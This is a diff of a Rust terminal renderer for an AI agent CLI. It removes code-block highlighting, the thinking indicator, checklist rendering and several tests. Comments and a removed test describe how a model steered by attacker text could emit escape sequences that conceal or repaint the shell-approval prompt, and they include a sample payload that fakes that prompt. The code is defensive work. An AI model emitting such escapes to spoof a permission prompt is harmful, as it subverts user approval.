@@ -1088,423 +289,23 @@ fn syntax_for_language(lang: Option<&str>) -> &'static SyntaxReference {
     resolved.unwrap_or_else(|| set.find_syntax_plain_text())
 }
 
-/// Render a fenced code block to ANSI-highlighted text. `lines` is
-/// `[opening_fence, body…, closing_fence?]` (the closing fence is absent when the stream ended
-/// mid-block). The fence lines keep the Markdown coloring; the body is highlighted with the block's
-/// own language grammar, falling back to plain text for an absent or unknown tag. Every line ends
-/// in a single `\n`.
-fn render_code_block_to_string(lines: &[String]) -> String {
-    let Some((opening, rest)) = lines.split_first() else {
-        return String::new();
-    };
-    let language = parse_fence_language(opening);
-    let (body, closing) = match rest.split_last() {
-        Some((last, body)) if is_code_fence(last) => (body, Some(last)),
-        _ => (rest, None),
-    };
-
-    let mut out = highlight_markdown_to_string(&format!("{opening}\n"));
-    if !body.is_empty() {
-        let body: String = body.iter().map(|line| format!("{line}\n")).collect();
-        out.push_str(&highlight_with_syntax(&body, syntax_for_language(language)));
-    }
-    if let Some(closing) = closing {
-        out.push_str(&highlight_markdown_to_string(&format!("{closing}\n")));
-    }
-    out
-}
-
 fn is_table_line(line: &str) -> bool {
     let trimmed = line.trim();
     trimmed.starts_with('|') && trimmed.ends_with('|') && trimmed.len() > 1
 }
 
-fn is_separator_row(cells: &[String]) -> bool {
-    cells.iter().all(|cell| {
-        cell.chars()
-            .all(|character| character == '-' || character == ':')
-    })
+/// `text` flattened onto one line. Reasoning tends to open with a short header (`Key facts:`,
+/// `Plan:`) and put the substance on the lines below it, so words are pulled up across line breaks
+/// rather than the row being spent on the header.
+fn collapse_to_line(text: &str) -> String {
+    text.split_whitespace().collect::<Vec<_>>().join(" ")
 }
 
-fn parse_table_row(line: &str) -> Vec<String> {
-    let trimmed = line.trim();
-    let inner = trimmed
-        .strip_prefix('|')
-        .unwrap_or(trimmed)
-        .strip_suffix('|')
-        .unwrap_or(trimmed);
-    inner
-        .split('|')
-        .map(|cell| cell.trim().to_string())
-        .collect()
-}
-
-fn format_table(lines: &[String]) -> Vec<String> {
-    if lines.is_empty() {
-        return Vec::new();
-    }
-
-    let parsed: Vec<Vec<String>> = lines.iter().map(|line| parse_table_row(line)).collect();
-
-    let column_count = parsed.iter().map(|row| row.len()).max().unwrap_or(0);
-    if column_count == 0 {
-        return lines.to_vec();
-    }
-
-    let mut column_widths = vec![0usize; column_count];
-    for row in &parsed {
-        if is_separator_row(row) {
-            continue;
-        }
-        for (column_index, cell) in row.iter().enumerate() {
-            if column_index < column_count {
-                column_widths[column_index] = column_widths[column_index].max(display_width(cell));
-            }
-        }
-    }
-
-    // A markdown delimiter cell is at least three dashes.
-    for width in &mut column_widths {
-        *width = (*width).max(3);
-    }
-
-    let mut result = Vec::new();
-    for row in &parsed {
-        if is_separator_row(row) {
-            let separator: Vec<String> = column_widths
-                .iter()
-                .map(|width| "-".repeat(*width))
-                .collect();
-            result.push(format!("| {} |", separator.join(" | ")));
-        } else {
-            let padded: Vec<String> = (0..column_count)
-                .map(|column_index| {
-                    let cell = row.get(column_index).map(|s| s.as_str()).unwrap_or("");
-                    let padding = column_widths[column_index].saturating_sub(display_width(cell));
-                    format!("{}{}", cell, " ".repeat(padding))
-                })
-                .collect();
-            result.push(format!("| {} |", padded.join(" | ")));
-        }
-    }
-
-    result
-}
-
-/// Whether a live, redrawn-in-place indicator can be shown at all.
-///
-/// Callers gate their whole indicator path on this rather than relying on the drawer's own check:
-/// drawing is only the last step, and the steps before it (closing a text run, claiming the
-/// blank the console owes the next block) are shared state that must not move for output that
-/// will never appear. Piping a run through `cat` otherwise gained a stray blank line per
-/// thinking block.
-pub(crate) fn live_indicator_supported() -> bool {
-    std::io::IsTerminal::is_terminal(&std::io::stderr())
-}
-
-/// Draw the live thinking indicator in place, returning whether anything was drawn.
-///
-/// Redraws overwrite each other, but the *last* draw is normally kept: the caller commits it with a
-/// newline when the thinking phase ends, so the record of what the model spent survives in
-/// scrollback the way a visible thinking block does. It is erased only when a thinking block with
-/// real text is about to replace it.
-///
-/// Returns `false` without drawing when stderr is not a terminal. Redrawing in place needs a
-/// terminal that honors a carriage return; redirected to a file this would accumulate one line per
-/// token estimate.
-///
-/// Redraws by returning to column zero, writing the label, and clearing to the end of the line --
-/// not by overwriting the previous label's width. The label does not grow monotonically with the
-/// count (`format_token_count` switches to `M` at a million, so `1000.0k tokens` is *wider* than
-/// `1.0M tokens`), so a width-tracking erase would strand the tail of a longer previous draw.
-/// Clearing to the line end makes that class of bug unrepresentable.
-///
-/// Written with no trailing newline, so the cursor stays parked on the line for the next redraw or
-/// erase.
-pub(crate) fn render_thinking_indicator(estimated_tokens: Option<u64>) -> bool {
-    use std::io::IsTerminal;
-    if !std::io::stderr().is_terminal() {
-        return false;
-    }
-    let label = match estimated_tokens {
-        Some(tokens) => format!("Thinking... ({} tokens)", format_token_count(tokens)),
-        // No estimate yet: the block has only just opened. The bare word is still worth drawing --
-        // it is the difference between a wait the user can interpret and one they cannot.
-        None => "Thinking...".to_string(),
-    };
-    // One `execute!`, so a redraw cannot be torn between the carriage return and the text.
-    crossterm::execute!(
-        std::io::stderr(),
-        crossterm::cursor::MoveToColumn(0),
-        crossterm::style::Print(label.as_str().with(Color::DarkGrey)),
-        crossterm::terminal::Clear(crossterm::terminal::ClearType::UntilNewLine),
-    )
-    .is_ok()
-}
-
-/// Discard whatever an in-place status line left on the current row, so the caller starts at column
-/// zero.
-///
-/// Two writers park the cursor mid-row without a newline: the thinking indicator, and the MCP
-/// progress line, which is `\r[mcp:server/tool] ...` and server-controlled. Anything printed next
-/// continues that row. For an approval prompt that is the whole ballgame -- an
-/// `[approval] shell_execute` line appended to a server's progress text reads as one line, and
-/// the rule the rest of this file is built on is that meka's own chrome starts at column zero.
-pub(crate) fn begin_own_line() {
-    use std::io::IsTerminal;
-    if !std::io::stderr().is_terminal() {
-        return;
-    }
-    if let Err(error) = write_own_line_prelude(&mut std::io::stderr()) {
-        // A broken pipe or closed terminal. Nothing to recover: the line is cosmetic and the caller
-        // has already dropped its state.
-        tracing::debug!("failed to clear the status line: {error}");
-    }
-}
-
-/// The sequence [`begin_own_line`] writes. Split out so a test can read it: the function itself
-/// returns early off a tty, which is every test process.
-fn write_own_line_prelude(out: &mut impl std::io::Write) -> std::io::Result<()> {
-    crossterm::queue!(
-        out,
-        // Attributes first, and load-bearing rather than tidy. `Clear(UntilNewLine)` is `ESC[K`,
-        // which erases *using the current attributes*, so a model-controlled `ESC[8m` (conceal)
-        // that reached the terminal survives the clear and everything meka prints next is
-        // invisible -- including the `[approval]` prompt this is called to make legible.
-        // crossterm's `PrintStyledContent` does not close the gap either: it resets only
-        // the foreground.
-        crossterm::style::ResetColor,
-        crossterm::style::SetAttribute(crossterm::style::Attribute::Reset),
-        crossterm::cursor::MoveToColumn(0),
-        crossterm::terminal::Clear(crossterm::terminal::ClearType::UntilNewLine),
-    )?;
-    out.flush()
-}
-
-/// Fixed chrome in `Thinking... <preview>`.
-const THINKING_PREFIX: &str = "Thinking... ";
-
-/// Characters of a block the preview reads in order to show one row of it.
-///
-/// Bounds the parse rather than the display. A block can run to tens of kilobytes and this shows a
-/// line of it, so the read stops somewhere; a span longer than this still prints its marker, which
-/// is no worse than showing the marker for every span. Counted in characters and not scaled to the
-/// terminal, because what it covers is the length of an emphasis span in prose, which has nothing
-/// to do with how wide the window is.
-const PREVIEW_LOOKAHEAD: usize = 1024;
-
-/// Flatten `text` onto one line, stopping once there is more than `max_chars` to show.
-///
-/// Reasoning tends to open with a short header (`Key facts:`, `Plan:`) and put the substance on the
-/// lines below it. Previewing only up to the first newline therefore spent the whole line on the
-/// header, so words are pulled up across line breaks until the budget is full instead.
-///
-/// The early exit is what keeps this from copying a block that can run to tens of kilobytes in
-/// order to show one line of it.
-///
-/// Deliberately counting *characters* while the real cut is by *column*, which is cheap and almost
-/// always leaves [`truncate_to_width`] more material than it needs. Not always: a zero-width
-/// character counts one and measures none, so a run of them can spend the whole budget on nothing.
-/// That is why the cut is *reported* rather than inferred downstream -- the caller cannot tell a
-/// block that ended from one whose remainder measured zero.
-///
-/// Returns whether anything was left behind. Only this loop knows: what it stops short of is
-/// *source*, and the caller sees the source only after it has been rendered, which can be many
-/// times shorter -- a run of zero-width characters is one unbroken "word" that survives as nothing,
-/// an entity renders to a single glyph. A caller judging the cut by the rendered width alone
-/// therefore reports a whole block when it is showing the first few characters of one.
-fn collapse_to_line(text: &str, max_chars: usize) -> (String, bool) {
-    let mut collapsed = String::new();
-    let mut words = text.split_whitespace();
-    while let Some(word) = words.next() {
-        if !collapsed.is_empty() {
-            collapsed.push(' ');
-        }
-        collapsed.push_str(word);
-        if collapsed.chars().count() > max_chars {
-            return (collapsed, words.next().is_some());
-        }
-    }
-    (collapsed, false)
-}
-
-/// Render a thinking block as the one dimmed line shown under `show_content = false`.
-///
-/// Reasoning is model output and gets the same escape-stripping as a tool argument. It is not
-/// merely defensive: a model that has read attacker-controlled text (a fetched page, a tool result)
-/// can be steered into emitting escapes. Sanitizing after collapsing rather than before keeps the
-/// early exit in [`collapse_to_line`] bounding the work on a block that can run to tens of
-/// kilobytes; collapsing only concatenates, so nothing an escape could hide behind survives the
-/// later pass.
-pub(crate) fn render_thinking_preview(thinking: &str) {
-    let mut line = format!("{}", THINKING_PREFIX.with(Color::DarkGrey));
-    for run in thinking_preview_runs(thinking, output_width()) {
-        // One color, emphasis by attribute, exactly as the full block is skinned. Applied per run
-        // rather than once around the line, because a run's attribute has to close with it.
-        let mut styled = run.text.with(Color::DarkGrey);
-        if run.bold {
-            styled = styled.bold();
-        }
-        if run.italic {
-            styled = styled.italic();
-        }
-        if run.strikeout {
-            styled = styled.crossed_out();
-        }
-        line.push_str(&format!("{styled}"));
-    }
-    write_stderr_line(line);
-}
-
-/// The styled runs [`render_thinking_preview`] prints.
-///
-/// Truncated as plain text and only then re-styled, so a cut can never land inside an escape
-/// sequence. Doing it the other way round means measuring a string whose bytes are mostly not
-/// glyphs, and cutting one leaves the terminal holding half a sequence.
-fn thinking_preview_runs(thinking: &str, width: usize) -> Vec<markdown::OwnedCompound> {
-    // The row is the label plus the preview, so the preview gets what the label leaves. Same total
-    // as the tool indicator, which spends the whole width on one line too.
-    thinking_preview_runs_within(
-        thinking,
-        width.saturating_sub(display_width(THINKING_PREFIX)),
-    )
-}
-
-/// The preview's styled runs cut to `budget` columns, for a row whose label is not
-/// [`THINKING_PREFIX`].
-fn thinking_preview_runs_within(thinking: &str, budget: usize) -> Vec<markdown::OwnedCompound> {
-    // Collapsed well past what the row can show, because the cut is made on the markdown *source*
-    // and markdown does not survive being cut: a span whose closing `**` falls beyond the budget
-    // never closes, and its opener renders as the text this preview exists to stop showing. A fixed
-    // margin rather than the row's own width, so a span closing just past the edge still closes.
-    let (collapsed, dropped) = collapse_to_line(thinking, budget.saturating_add(PREVIEW_LOOKAHEAD));
-    let runs = markdown::inline_runs(&sanitize_to_line(&collapsed, usize::MAX));
-    let mut plain: String = runs.iter().map(|run| run.text.as_str()).collect();
-    // Two cuts can happen and either must be admitted: the collapse leaves source behind, and
-    // `truncate_to_width` leaves rendered text behind. Only the first can pass unnoticed, because
-    // source compresses -- two thousand zero-width characters are one "word" that renders to
-    // nothing, so a block cut to its first three letters comes back well inside the row and reads
-    // as the whole of it.
-    if dropped {
-        plain.push_str(TRUNCATION_MARKER);
-    }
-    restyle(&truncate_to_width(&plain, budget), &runs)
-}
-
-/// The plain text [`thinking_preview_runs`] shows, for the tests that measure it and the ones that
-/// hold it to the escape-stripping [`render_thinking_preview`] promises.
-#[cfg(test)]
-fn thinking_preview_text(thinking: &str, width: usize) -> String {
-    thinking_preview_runs(thinking, width)
-        .iter()
-        .map(|run| run.text.as_str())
-        .collect()
-}
-
-/// Carry `runs`' styling onto `plain`, which is their concatenation after a cut.
-///
-/// Anything past the end of the runs is the cut's own marker rather than the model's text, so it
-/// comes back unstyled: the ellipsis is meka saying there was more, not the model still speaking.
-fn restyle(plain: &str, runs: &[markdown::OwnedCompound]) -> Vec<markdown::OwnedCompound> {
-    let mut out: Vec<markdown::OwnedCompound> = Vec::new();
-    let mut rest = plain;
-    for run in runs {
-        if rest.is_empty() {
-            break;
-        }
-        // The shared prefix of this run and what is left. A cut lands on a character boundary, so
-        // this is a whole number of characters of the run.
-        let taken = rest
-            .char_indices()
-            .zip(run.text.char_indices())
-            .take_while(|((_, left), (_, right))| left == right)
-            .map(|((index, character), _)| index + character.len_utf8())
-            .last()
-            .unwrap_or(0);
-        if taken == 0 {
-            break;
-        }
-        out.push(markdown::OwnedCompound {
-            text: rest[..taken].to_string(),
-            ..run.clone()
-        });
-        rest = &rest[taken..];
-    }
-    if !rest.is_empty() {
-        out.push(markdown::OwnedCompound {
-            text: rest.to_string(),
-            ..Default::default()
-        });
-    }
-    out
-}
-
-/// Render the checklist to stderr: the heading, a blank, and one row per item, as one block the
-/// console sets off from its neighbors. The blank inside is the block's own, like the rows; the
-/// blanks around it are the console's. An empty list prints nothing, never a heading over
-/// nothing.
-pub(crate) fn render_checklist(items: &[crate::checklist::ChecklistItem]) {
-    use crate::checklist::ChecklistStatus;
-
-    if items.is_empty() {
-        return;
-    }
-    let width = output_width();
-    write_stderr_line(checklist_heading(width).with(Color::White).bold());
-    write_stderr_line("");
-    for item in items {
-        // Composed uncolored first, then colored, so the width a test measures is the width that
-        // prints. Coloring in place would put escape bytes in the middle of the string.
-        let row = checklist_row(item, width);
-        let (marker, rest) = row.split_at(row.find(' ').map_or(0, |space| space + 1));
-        // The item in progress takes the yellow every "worth a look" mark takes; the rest recede
-        // in the dark grey of a hint, so the one row that matters stands out of the list.
-        let color = match item.status {
-            ChecklistStatus::InProgress => Color::Yellow,
-            ChecklistStatus::Pending | ChecklistStatus::Deferred => Color::DarkGrey,
-        };
-        write_stderr_line(format!("{}{}", marker, rest.with(color)));
-    }
-}
-
-/// The columns a row spends before the item's text: `- `, the marker, a space, the id and a space;
-/// none of it model-supplied.
-fn checklist_chrome(item: &crate::checklist::ChecklistItem) -> usize {
-    "- ".len() + 3 + 1 + item.id.to_string().len() + 1
-}
-
-/// The heading, not indented, fitted to `width` like every other composed line.
-fn checklist_heading(width: usize) -> String {
-    truncate_to_width("Checklist", width)
-}
-
-/// One item's whole row, chrome included, fitted to `width`.
-///
-/// The chrome is computed here rather than at the call site so a test can hold the real budget to
-/// the real width. Held apart, a test that recomputed the subtraction itself passed even with the
-/// caller's subtraction deleted.
-fn checklist_row(item: &crate::checklist::ChecklistItem, width: usize) -> String {
-    use crate::checklist::ChecklistStatus;
-
-    let marker = match item.status {
-        ChecklistStatus::InProgress => "[~]",
-        ChecklistStatus::Pending => "[ ]",
-        ChecklistStatus::Deferred => "[>]",
-    };
-    format!(
-        "- {} {} {}",
-        marker,
-        item.id,
-        checklist_item_text(item, width.saturating_sub(checklist_chrome(item)))
-    )
-}
-
-/// One item's text, fitted to `budget`. Model-supplied, and the list prints at column zero, so
-/// it is sanitized: a `\n` or a `\r` in it would plant a line that looks like meka's own. A
-/// deferred item's reason is not shown: a row says the item is parked, and the reason, a
-/// paragraph as often as not, is in the record, the feed and `checklist_read` for whoever asks.
-fn checklist_item_text(item: &crate::checklist::ChecklistItem, budget: usize) -> String {
-    sanitize_to_line(&item.text, budget)
+/// The styled runs of the screen's thinking row: the block on one line, its markdown rendered to
+/// styles and its escapes stripped. The row cuts the runs at its own edge, so the one marker on the
+/// screen is the screen's own.
+fn thinking_preview_runs(thinking: &str) -> Vec<markdown::OwnedCompound> {
+    markdown::inline_runs(&sanitize_to_line(&collapse_to_line(thinking), usize::MAX))
 }
 
 /// The `/compact` confirmation line.
@@ -1724,35 +525,6 @@ mod direction_tests {
 
 #[cfg(test)]
 mod tests {
-    /// Everything meka prints on its own line has to start from a known attribute state.
-    ///
-    /// `ESC[K` erases *using the current attributes*, so clearing the row does not undo a
-    /// model-controlled `ESC[8m` that reached the terminal -- it re-applies it to the cleared
-    /// cells. Everything printed after, including the `[approval]` prompt this call exists to make
-    /// legible, then renders concealed. The reset has to lead, and this asserts the order rather
-    /// than merely its presence.
-    ///
-    /// Not on Windows, where crossterm may take the console-API path instead of emitting ANSI.
-    #[cfg(not(windows))]
-    #[test]
-    fn own_line_resets_attributes_before_it_clears_the_row() {
-        let mut written = Vec::new();
-        super::write_own_line_prelude(&mut written).expect("write to a Vec cannot fail");
-        let sequence = String::from_utf8(written).expect("crossterm emits ASCII");
-
-        let reset = sequence
-            .find("\u{1b}[0m")
-            .expect("an explicit reset must be emitted");
-        let clear = sequence
-            .find("\u{1b}[K")
-            .expect("the row clear must be emitted");
-        assert!(
-            reset < clear,
-            "the reset must precede the clear, or the clear re-applies the attribute it was \
-             meant to escape; got {sequence:?}",
-        );
-    }
-
     /// The `/compact` line has to name what the checkpoint wrote, because a memory is durable and
     /// instance-scoped: notes accumulating unmentioned under a command called "compact" is the
     /// surprise this reporting exists to prevent.
@@ -1767,6 +539,10 @@ mod tests {
             line,
             "Session compacted. Wrote 2 memories: deploy-quirks, rate-limits."
         );
+    }
+
+    fn params(input: serde_json::Value) -> String {
+        super::render_whole_params(&input, TEST_WIDTH).join("\n")
     }
 
     #[test]
@@ -1794,31 +570,10 @@ mod tests {
         );
     }
 
-    /// The indicator's label is **not** monotonically wider as the count grows: at a million
-    /// `format_token_count` switches suffix, so `1000.0k tokens` (20 columns) becomes `1.0M tokens`
-    /// (17). A redraw that erased only its own width would leave three characters of the previous
-    /// label stranded on the line.
-    ///
-    /// Asserted as a counterexample so the drawer's clear-to-end-of-line is not "simplified" back
-    /// into width tracking, which looks equivalent and is not.
-    #[test]
-    fn indicator_label_can_shrink_as_the_count_grows() {
-        let width = |tokens: u64| {
-            format!("Thinking... ({} tokens)", format_token_count(tokens))
-                .chars()
-                .count()
-        };
-        assert!(
-            width(1_000_000) < width(999_999),
-            "expected the label to shrink crossing 1M ({} -> {}); if this ever stops holding the \
-             comment on `render_thinking_indicator` needs revisiting, not the erase strategy",
-            width(999_999),
-            width(1_000_000),
-        );
-    }
-
     use super::*;
-    use crate::text::{format_columns, format_duration_short, sanitize_for_display};
+    use crate::text::{
+        format_columns, format_duration_short, sanitize_for_display, sanitize_stream_text,
+    };
 
     #[test]
     fn format_duration_short_picks_the_two_largest_units() {
@@ -1882,44 +637,6 @@ mod tests {
     }
 
     #[test]
-    fn highlight_markdown_emits_ansi() {
-        let out = highlight_markdown_to_string("# Hello\n");
-        // ANSI escape prefix for any colored output.
-        assert!(
-            out.contains("\x1b["),
-            "expected ANSI escape in highlighter output, got: {out:?}"
-        );
-        // Final reset so colors don't bleed into subsequent stdout writes.
-        assert!(out.ends_with("\x1b[0m"));
-    }
-
-    #[test]
-    fn highlight_markdown_preserves_content() {
-        // Stripping ANSI escapes should give back the original text.
-        let input = "Plain text with no markdown.\n";
-        let out = highlight_markdown_to_string(input);
-        let stripped = strip_ansi_escapes(&out);
-        assert!(stripped.starts_with(input));
-    }
-
-    /// Code is colored from the terminal's palette, by slot, never in 24-bit: a string in the
-    /// green slot, a keyword in the blue one, and the rest the default foreground.
-    #[test]
-    fn code_is_highlighted_in_the_terminal_s_palette() {
-        let lines = [
-            "```rust".to_string(),
-            "let name = \"s\";".to_string(),
-            "```".to_string(),
-        ];
-        let out = render_code_block_to_string(&lines);
-        assert!(out.contains("\x1b[34mlet"), "the keyword slot: {out:?}");
-        assert!(out.contains("\x1b[32m\""), "the string slot: {out:?}");
-        assert!(!out.contains("\x1b[38;2;"), "no 24-bit color: {out:?}");
-        assert_eq!(palette_slot(palette(6)), Some(6));
-        assert_eq!(palette_slot(FOREGROUND), None);
-    }
-
-    #[test]
     fn parse_fence_language_takes_the_first_word_after_the_fence() {
         assert_eq!(parse_fence_language("```rust"), Some("rust"));
         assert_eq!(parse_fence_language("```"), None);
@@ -1956,124 +673,6 @@ mod tests {
     }
 
     #[test]
-    fn code_block_body_is_language_highlighted() {
-        // Regression guard for the whole feature: the Rust grammar tokenizes the body into several
-        // colors, where the Markdown grammar renders it flat.
-        let rust = "fn main() {\n    let x = 42;\n    println!(\"hi\");\n}\n";
-        let rust_colors = distinct_fg_colors(&highlight_with_syntax(
-            rust,
-            syntax_for_language(Some("rust")),
-        ));
-        let markdown = highlighter()
-            .syntax_set
-            .find_syntax_by_name("Markdown")
-            .expect("markdown syntax present");
-        let flat_colors = distinct_fg_colors(&highlight_with_syntax(rust, markdown));
-        assert!(
-            rust_colors > 1,
-            "rust body should be multi-colored, got {rust_colors}",
-        );
-        assert!(
-            rust_colors > flat_colors,
-            "language highlighting ({rust_colors}) should be richer than markdown ({flat_colors})",
-        );
-    }
-
-    #[test]
-    fn code_block_highlight_preserves_content() {
-        // Stripping ANSI from a language-highlighted block returns the original code byte-for-byte.
-        let code = "fn main() {\n    let x = 42;\n}\n";
-        let out = highlight_with_syntax(code, syntax_for_language(Some("rust")));
-        assert_eq!(strip_ansi_escapes(&out), code);
-    }
-
-    #[test]
-    fn render_code_block_structure_and_body_highlight() {
-        let lines = vec![
-            "```rust".to_string(),
-            "fn main() {".to_string(),
-            "    let x = 42;".to_string(),
-            "}".to_string(),
-            "```".to_string(),
-        ];
-        let out = render_code_block_to_string(&lines);
-        // Fences + body round-trip verbatim, each line ending in exactly one newline.
-        assert_eq!(
-            strip_ansi_escapes(&out),
-            "```rust\nfn main() {\n    let x = 42;\n}\n```\n",
-        );
-        // The body is language-highlighted (multiple colors), not flat.
-        assert!(distinct_fg_colors(&out) > 1);
-    }
-
-    #[test]
-    fn render_code_block_handles_unterminated_and_empty() {
-        // Unterminated block (no closing fence) still renders the opening fence + body.
-        let unterminated = vec!["```rust".to_string(), "let x = 1;".to_string()];
-        assert_eq!(
-            strip_ansi_escapes(&render_code_block_to_string(&unterminated)),
-            "```rust\nlet x = 1;\n",
-        );
-        // Empty block (fences only) renders both fences and no body.
-        let empty = vec!["```rust".to_string(), "```".to_string()];
-        assert_eq!(
-            strip_ansi_escapes(&render_code_block_to_string(&empty)),
-            "```rust\n```\n",
-        );
-        // No panic on the degenerate single-fence case.
-        assert_eq!(
-            strip_ansi_escapes(&render_code_block_to_string(&["```".to_string()])),
-            "```\n",
-        );
-    }
-
-    /// The distinct 24-bit foreground colors (`ESC[38;2;R;G;B`) in ANSI-escaped output.
-    /// Every foreground SGR in `ansi`, by its parameter: a palette slot (`3n`, `9n`), an indexed
-    /// color (`38;5;n`) or a 24-bit one (`38;2;r;g;b`), the default (`39`) left out.
-    fn fg_color_set(ansi: &str) -> std::collections::BTreeSet<String> {
-        let mut colors = std::collections::BTreeSet::new();
-        let mut rest = ansi;
-        while let Some(pos) = rest.find("\x1b[") {
-            rest = &rest[pos + 2..];
-            let Some(end) = rest.find('m') else {
-                break;
-            };
-            let parameter = &rest[..end];
-            rest = &rest[end + 1..];
-            let is_foreground = parameter.starts_with("38;")
-                || matches!(parameter.len(), 2 if parameter.starts_with('3') || parameter.starts_with('9'));
-            if is_foreground && parameter != "39" {
-                colors.insert(parameter.to_string());
-            }
-        }
-        colors
-    }
-
-    /// Count distinct foreground colors in ANSI-escaped output.
-    fn distinct_fg_colors(ansi: &str) -> usize {
-        fg_color_set(ansi).len()
-    }
-
-    fn strip_ansi_escapes(input: &str) -> String {
-        // Minimal CSI stripper for test assertions: drops `ESC [ ... letter`.
-        let mut out = String::with_capacity(input.len());
-        let mut chars = input.chars().peekable();
-        while let Some(c) = chars.next() {
-            if c == '\x1b' && chars.peek() == Some(&'[') {
-                chars.next();
-                for inner in chars.by_ref() {
-                    if inner.is_ascii_alphabetic() {
-                        break;
-                    }
-                }
-            } else {
-                out.push(c);
-            }
-        }
-        out
-    }
-
-    #[test]
     fn truncate_to_width_short() {
         assert_eq!(truncate_to_width("hello", 10), "hello");
     }
@@ -2094,762 +693,31 @@ mod tests {
         assert_eq!(truncate_to_width("", 5), "");
     }
 
-    /// Reasoning that opens with a short header must not preview as `Thinking... Key facts:` and
+    /// Reasoning that opens with a short header must not preview as `• Thinking · Key facts:` and
     /// nothing else: the newline ends the line while most of the width is still unused.
     #[test]
     fn collapse_to_line_pulls_content_up_past_a_short_first_line() {
         assert_eq!(
-            collapse_to_line(
-                "Key facts:\nthe lock is held by the screen\nso serve defers",
-                80
-            ),
-            (
-                "Key facts: the lock is held by the screen so serve defers".to_string(),
-                false
-            )
+            collapse_to_line("Key facts:\nthe lock is held by the screen\nso serve defers"),
+            "Key facts: the lock is held by the screen so serve defers"
         );
     }
 
     #[test]
     fn collapse_to_line_flattens_blank_lines_and_indentation() {
         assert_eq!(
-            collapse_to_line("Plan:\n\n  1. read it\n\n  2. fix it\n", 80),
-            ("Plan: 1. read it 2. fix it".to_string(), false)
+            collapse_to_line("Plan:\n\n  1. read it\n\n  2. fix it\n"),
+            "Plan: 1. read it 2. fix it"
         );
-    }
-
-    /// Stopping one character past the budget rather than at it is what leaves `truncate_to_width`
-    /// able to tell "exactly full" from "there was more", so the ellipsis is not lost.
-    #[test]
-    fn collapse_to_line_stops_just_past_the_budget() {
-        let (collapsed, dropped) = collapse_to_line("alpha beta gamma delta", 10);
-        assert_eq!(collapsed, "alpha beta gamma");
-        assert!(
-            dropped,
-            "`delta` was left behind and the caller has to hear about it"
-        );
-        assert_eq!(truncate_to_width(&collapsed, 10), "alpha b...");
-    }
-
-    /// A block whose remainder is megabytes of reasoning must not be walked to render eighty
-    /// characters of it. Checked through the output rather than the work done, since a word past
-    /// the budget is the only observable evidence the loop stopped early.
-    #[test]
-    fn collapse_to_line_does_not_consume_the_whole_block() {
-        let huge = format!("header\n{}", "word ".repeat(100_000));
-        let (collapsed, dropped) = collapse_to_line(&huge, 80);
-        assert!(collapsed.chars().count() <= 80 + "word".len() + 1);
-        assert!(dropped);
     }
 
     #[test]
     fn collapse_to_line_on_whitespace_only_thinking() {
-        assert_eq!(collapse_to_line("\n\n   \n", 80), (String::new(), false));
-    }
-
-    /// The bytes a thinking block puts on the terminal, with the styling stripped back off.
-    ///
-    /// Rendered through the real path rather than reassembled from its pieces, because everything
-    /// asserted about a thinking block below -- that no row exceeds the width, that no row after
-    /// the first starts at column zero, that no escape survives -- is a property of what reaches
-    /// the stream and not of any one function on the way there.
-    fn thinking_rows(text: &str, mode: RenderMode, terminal_width: usize) -> String {
-        let budget = terminal_width.saturating_sub(super::display_width(super::THINKING_PREFIX));
-        let mut renderer = super::StreamingRenderer::for_thinking(mode).capturing(budget);
-        renderer
-            .push_delta(text)
-            .expect("a captured write cannot fail");
-        renderer.finish().expect("a captured write cannot fail");
-        super::CSI_PATTERN
-            .replace_all(renderer.captured(), "")
-            .to_string()
-    }
-
-    /// The lead applied across the chunk shapes a stream actually arrives in.
-    ///
-    /// A chunk boundary is not a row boundary, so what the next write owes has to survive between
-    /// calls. Getting it wrong drops model text at column zero, where meka's own chrome lives.
-    #[test]
-    fn a_lead_labels_the_first_row_and_indents_the_rest() {
-        let lead = super::Lead {
-            opening: "Thinking... ",
-            continuation: "  ",
-            color: Color::DarkGrey,
-        };
-        let plain = |text: &str, owes| {
-            let (out, next) = lead.apply(text, owes);
-            (super::CSI_PATTERN.replace_all(&out, "").to_string(), next)
-        };
-
-        // Whole rows in one write.
-        assert_eq!(
-            plain("one\ntwo\n", super::Owes::Opening),
-            (
-                "Thinking... one\n  two\n".to_string(),
-                super::Owes::Continuation
-            )
-        );
-
-        // A chunk that stops mid-row owes nothing until the row ends, so the text resuming it is
-        // not indented a second time.
-        let (first, owes) = plain("one", super::Owes::Opening);
-        assert_eq!(
-            (first.as_str(), owes),
-            ("Thinking... one", super::Owes::Nothing)
-        );
-        assert_eq!(
-            plain(" and more\n", owes),
-            (" and more\n".to_string(), super::Owes::Continuation)
-        );
-
-        // A bare newline ends the row it was on and wears no indent of its own.
-        assert_eq!(
-            plain("\n", super::Owes::Nothing),
-            ("\n".to_string(), super::Owes::Continuation)
-        );
-
-        // A blank row neither spends the label nor leaves an indent behind on an empty line.
-        assert_eq!(
-            plain("\n\ntext", super::Owes::Opening),
-            ("\n\nThinking... text".to_string(), super::Owes::Nothing)
-        );
-    }
-
-    /// Reasoning is model output, and pulling words up across newlines carries text from below the
-    /// first line into the preview: a model steered by attacker-controlled text it has read can
-    /// clear the screen and repaint a permission prompt.
-    #[test]
-    fn a_thinking_preview_carries_no_escapes_from_below_the_first_line() {
-        let reasoning =
-            "Checking the file.\n\u{1b}[2J\u{1b}[1;1H[approval] shell_execute cat README (Y/n)";
-        let preview = super::thinking_preview_text(reasoning, TEST_WIDTH);
-        assert!(!preview.contains('\u{1b}'), "{preview:?}");
-        assert!(preview.starts_with("Checking the file."), "{preview:?}");
-    }
-
-    /// The preview is the line most people see, since `show_content` is off by default, and the
-    /// backends that emit a reasoning summary open every part with `**Bold header**`. The markers
-    /// become styling there too, not text.
-    #[test]
-    fn a_thinking_preview_styles_its_markers_rather_than_showing_them() {
-        let runs = super::thinking_preview_runs("**Planning research**\n\nThen check it.", 88);
-        assert_eq!(
-            runs.iter().map(|run| run.text.as_str()).collect::<String>(),
-            "Planning research Then check it."
-        );
-        assert!(
-            runs[0].bold,
-            "the header keeps its emphasis: {:?}",
-            runs[0].text
-        );
-        assert!(
-            runs.iter()
-                .filter(|run| run.bold)
-                .all(|run| run.text == "Planning research"),
-            "and nothing past it inherits the emphasis",
-        );
-    }
-
-    /// A preview whose *source* was cut says so, even when the rendered text fits the row easily.
-    ///
-    /// Source compresses, sometimes enormously, so "does the rendered text fit" is not the same
-    /// question as "was anything dropped". Each of these renders to a fraction of what it was cut
-    /// from, and each showed a few characters of a long block as though that were all of it.
-    #[test]
-    fn a_preview_says_so_when_the_source_was_cut_but_the_text_fits() {
-        for (name, reasoning, width) in [
-            // One unbroken "word" -- zero-width characters are not whitespace -- that survives
